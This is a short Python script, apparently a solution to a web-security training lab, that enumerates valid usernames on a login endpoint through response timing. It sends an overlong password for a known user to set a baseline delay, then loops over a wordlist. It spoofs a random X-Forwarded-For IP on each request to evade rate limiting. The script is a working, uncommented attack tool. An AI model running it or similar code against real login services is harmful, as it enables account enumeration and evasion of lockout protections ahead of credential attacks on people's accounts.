
import requests
import random
from pathlib import Path

ip = "link_to_lab"

wordlist_path = "path_to_wordlist"

wordlist = Path(wordlist_path).read_text().splitlines()

correct_username = "wiener"

correct_response_time = requests.post(ip, data=f"username={correct_username}&password=asdhasyudfadgiuhaosygduhbajsodihuasjdioaudasdhasyudfadgiuhaosygduhbajsodihuasjdioaudasdhasyudfadgiuhaosygduhbajsodihuasjdioaudasdhasyudfadgiuhaosygduhbajsodihuasjdioaud",timeout=10).elapsed.total_seconds()

for word in wordlist:
        response = requests.post(ip, data=f"username={word}&password=random", timeout=5, headers={"X-Forwarded-For" : f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"})
        if correct_response_time <= response.elapsed.total_seconds():
            print(word, response.elapsed.total_seconds(), correct_response_time)




